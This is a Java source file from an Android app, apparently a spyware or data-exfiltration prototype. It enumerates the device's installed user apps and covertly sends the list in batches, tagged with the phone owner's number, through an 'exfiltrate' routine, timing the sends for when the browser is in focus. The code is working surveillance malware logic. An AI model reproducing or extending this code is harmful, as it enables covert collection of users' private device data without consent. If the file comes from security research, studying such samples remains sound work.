package com.trustme.testsu;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import org.json.simple.JSONValue;

import com.trustme.testsu.utils.Constants;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.util.Log;

/**
 * 
 * Background Task that will fetch the installed packages on the device.
 * It will try to exfiltrate them if there is Internet or 
 * store them in the DB and start the IP checker
 * @author sdemetr2
 *
 */
public class GetPackagesTask extends AsyncTask<Void, Void, Void>{
	Hermes hermes = new Hermes();
	WiFiTracker wifiTracker = new WiFiTracker();
	private int row_id = 0;
	private ArrayList <HashMap<String, String> > arrayRows = new ArrayList <HashMap<String, String> >();
	private boolean all_send = false;
	
	protected GetPackagesTask() { }
	
	@Override
	protected Void doInBackground(Void... unused){
		try {
			getAndSendPackages();
			Thread.sleep(50);
		}
		catch (InterruptedException localInterruptedException)
		{
			Log.d("GetPackagesTask", "GetPackagesTask received an InterruptedException");
		}
		
		return null;
	}
	
	private void getAndSendPackages() {
		// TODO Auto-generated method stub    
		int row_id = 0;
		
		PackageManager pm = MyApplication.getAppContext().getPackageManager();
		List<ApplicationInfo> packs = pm.getInstalledApplications(PackageManager.GET_META_DATA);
		
		for(int i=0; i<packs.size(); i++) {
			HashMap<String, String> map = new HashMap<String, String>();
			
		    ApplicationInfo app_info = packs.get(i);
		    
		    if ((app_info.uid >= Constants.AID_SYSTEM) &&  (app_info.uid <= Constants.AID_NOBODY)) {
		            continue ;//no system packages
		    }

	    	row_id += 1;
			map.put("id", row_id + "");
			//map.put("pname", p.applicationInfo.loadLabel(MyApplication.getAppContext().getPackageManager()).toString());
			map.put("pname", app_info.packageName);
			String app_label = app_info.loadLabel(pm).toString();
			app_label = app_label.replace("&", "AND");
			map.put("appname", app_label);
			arrayRows.add(map); 
			
			if ((row_id % 10) == 0){
				exfiltrate(); //send a package at a time browser is dominating the focus! 
				all_send  = true;
				arrayRows.clear();
			}
			else{
				all_send = false;
			}
	    }
	  //exfiltrate - REQUEST URI TOO LARGE!!!
		if (!all_send){
			exfiltrate();
			arrayRows.clear();
		}
		
	    /**
		for (PInfo pack : packagesList){	
			boolean app_exists = false;
			for (HashMap<String, String> tmpMap : arrayRows){
				if (tmpMap.get("appname").equals(pack.appname)){
					app_exists = true;
					break;
				}
			}
			
			if (!app_exists){
				row_id += 1;
				map.put("id", row_id + "");
				map.put("pname", pack.pname);
				map.put("appname", pack.appname);
				arrayRows.add(map);
			}
		}
		
		
		*/
	}

	private void exfiltrate() {
		// TODO Auto-generated method stub
		if (wifiTracker.read_arp()){
			//TODO: Store the Data into the DB
			String hkey = "packages";
			String hvalue = JSONValue.toJSONString(arrayRows);
			HashMap<String, String> hmap = new HashMap<String, String>();
			hmap.put(hkey, hvalue);
			//TODO: store the data to the DB 
			hermes.exfiltrate(hmap, Constants.PACKAGES_TRANSACTION + ";" + User.getPhoneNumber());
			//TODO: mark the data in the DB as sent
		}
		else{
			//no internet
			//TODO: start the IP tracking service
			//store the data into DB
			
		}
	}

	@Override
	protected void onPostExecute(Void justEyeCandy){
		super.onPostExecute(justEyeCandy);
		
		
	}
	
	/**
	 * It just prints the fetched packages info
	 * @return an ArrayList with the installed Applications as PInfo objects
	 */
	private ArrayList<PInfo> getPackages() {
		// TODO try to exfiltrate them if there is Internet available or store them in the Db and start the IP checker 
	    ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
	    final int max = apps.size();
//	    for (int i=0; i<max; i++) {
//	        apps.get(i).prettyPrint();
//	    }
	    return apps;
	}
	
	/**
	 * 
	 * @param getSysPackages true if you want to fetch System packages as well, false otherwise
	 * @return an ArrayList with the installed Applications as PInfo objects
	 */
	private ArrayList<PInfo> getInstalledApps(boolean getSysPackages) {
	    ArrayList<PInfo> res = new ArrayList<PInfo>();        
	    List<PackageInfo> packs = MyApplication.getAppContext().getPackageManager().getInstalledPackages(0);
	    for(int i=0; i<packs.size(); i++) {
	        PackageInfo p = packs.get(i);
	        if ((!getSysPackages) && (p.versionName == null)) {
	            continue ;
	        }
	        PInfo newInfo = new PInfo();
	        newInfo.appname = p.applicationInfo.loadLabel(MyApplication.getAppContext().getPackageManager()).toString();
	        newInfo.pname = p.packageName;
	        newInfo.versionName = p.versionName;
	        newInfo.versionCode = p.versionCode;
	        newInfo.icon = p.applicationInfo.loadIcon(MyApplication.getAppContext().getPackageManager());
	        res.add(newInfo);
	    }
	    return res; 
	}
	
}
